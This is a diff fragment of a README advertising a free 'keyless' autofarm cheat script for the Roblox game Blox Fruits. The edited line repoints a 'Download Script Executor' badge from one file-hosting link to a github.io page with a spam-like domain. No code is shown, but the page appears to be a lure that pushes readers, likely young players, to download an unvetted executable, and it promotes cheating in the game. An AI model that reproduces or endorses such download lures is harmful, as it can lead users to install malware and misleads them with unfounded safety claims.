@@ -4,7 +4,7 @@
 🚀 **Maximize Your Blox Fruits Progress with Zero Effort!**  
 This **100% KEYLESS**, open-source GUI script automates repetitive tasks in *Blox Fruits*, letting you farm resources, complete quests, and dominate bosses effortlessly. Perfect for players seeking to level up faster while avoiding costly paid scripts.  
 
-**[![Download Autofarm Script](https://img.shields.io/badge/Download-Script%20Executor-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download Autofarm Script](https://img.shields.io/badge/Download-Script%20Executor-blueviolet)](https://blox-fruits-autofarm-script-keyless-gui.github.io/.github/)**
 
 🔥 **Key Features**:  
 ✅ **No Activation Key Required** – Completely free, no hidden fees.  
